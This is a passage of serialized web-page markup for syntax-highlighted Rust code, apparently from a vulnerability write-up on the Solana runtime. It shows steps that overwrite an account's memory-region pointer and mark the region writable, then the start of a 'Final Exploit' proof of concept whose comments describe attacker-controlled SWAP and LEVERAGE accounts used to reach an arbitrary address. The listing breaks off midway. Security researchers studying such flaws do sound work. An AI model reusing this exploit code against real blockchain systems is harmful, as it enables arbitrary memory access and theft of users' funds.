token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"21\"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\u003c\"]}],[\"$\",\"span\",\"code-segement29\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"21\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[2]}],\"\\n\",[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Overwrite POINTER account's backing buffer pointer (arb_ptr)\"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement44\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_ptr \"]}],[\"$\",\"span\",\"code-segement45\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement47\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x490\"]}],[\"$\",\"span\",\"code-segement48\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement49\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement56\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement57\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" thread_mem\"]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement63\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Set memory region state to writable\"]}],[\"$\",\"span\",\"code-segement65\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement67\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement69\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement70\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement71\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_ptr \"]}],[\"$\",\"span\",\"code-segement72\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement73\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement74\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x4b8\"]}],[\"$\",\"span\",\"code-segement75\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement76\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement77\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement78\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement79\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement80\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement81\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement82\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement83\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement85\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement86\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement87\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}],[\"$\",\"span\",\"code-segement88\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]]]}]}]}],\"\\n\",[\"$\",\"h3\",\"h3-22\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"Final Exploit\"}],\"\\n\",[\"$\",\"p\",\"p-126\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"Putting them all together, here's the final PoC:\"}],\"\\n\",[\"$\",\"pre\",\"pre-21\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"rounded-sm\",\"style\":{\"color\":\"#ccc\",\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#ccc\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"use\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"std\"]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"ptr\"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" mem\"]}],[\"$\",\"span\",\"code-segement9\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"rc\"]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"cell\"]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement23\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"use\"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"solana_program\"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement29\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"account_info\"]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement34\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountInfo\"]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement39\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"instruction\"]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountMeta\"]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement44\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement45\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Instruction\"]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement47\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"program\"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"invoke_signed\"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement57\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    entrypoint\"]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[7]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"entrypoint\"]}],[\"$\",\"span\",\"code-segement63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"ProgramResult\"]}],[\"$\",\"span\",\"code-segement65\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement66\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[8]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement69\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"pubkey\"]}],[\"$\",\"span\",\"code-segement70\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement71\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}],[\"$\",\"span\",\"code-segement72\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement73\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[9]}],[\"$\",\"span\",\"code-segement75\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement76\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement77\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement78\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[10]}],\"\\n\",[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[11]}],[\"$\",\"span\",\"code-segement82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement83\",{\"className\":\"token token macro\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"entrypoint!\"]}],[\"$\",\"span\",\"code-segement84\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement85\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"process_instruction\"]}],[\"$\",\"span\",\"code-segement86\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement87\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement88\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[12]}],\"\\n\",[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[13]}],[\"$\",\"span\",\"code-segement92\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement93\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// accounts[0]: SWAP account controlled by ATTACKER, owned by this EXPLOIT program.\"]}],[\"$\",\"span\",\"code-segement94\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[14]}],[\"$\",\"span\",\"code-segement96\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement97\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// accounts[1]: POINTER account whose MemoryRegion will point to an arbitrary address.\"]}],[\"$\",\"span\",\"code-segement98\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[15]}],[\"$\",\"span\",\"code-segement100\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement101\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// accounts[6]: LEVERAGE account controlled by ATTACKER, owned by this EXPLOIT program.\"]}],[\"$\",\"span\",\"code-segement102\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[16]}],\"\\n\",[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[17]}],[\"$\",\"span\",\"code-segement106\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement107\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement108\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement109\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"fn\"]}],[\"$\",\"span\",\"code-segement110\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement111\",{\"className\":\"token token function-definition\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"process_instruction\"]}],[\"$\",\"span\",\"code-segement112\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement113\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--18\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[18]}],[\"$\",\"span\",\"code-segement115\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    program_id\"]}],[\"$\",\"span\",\"code-segement116\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement117\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement118\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement119\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}],[\"$\",\"span\",\"code-segement120\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement121\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--19\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[19]}],[\"$\",\"span\",\"code-segement123\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    accounts\"]}],[\"$\",\"span\",\"code-segement124\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement125\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement126\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement127\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement128\",{\"className\":\"token 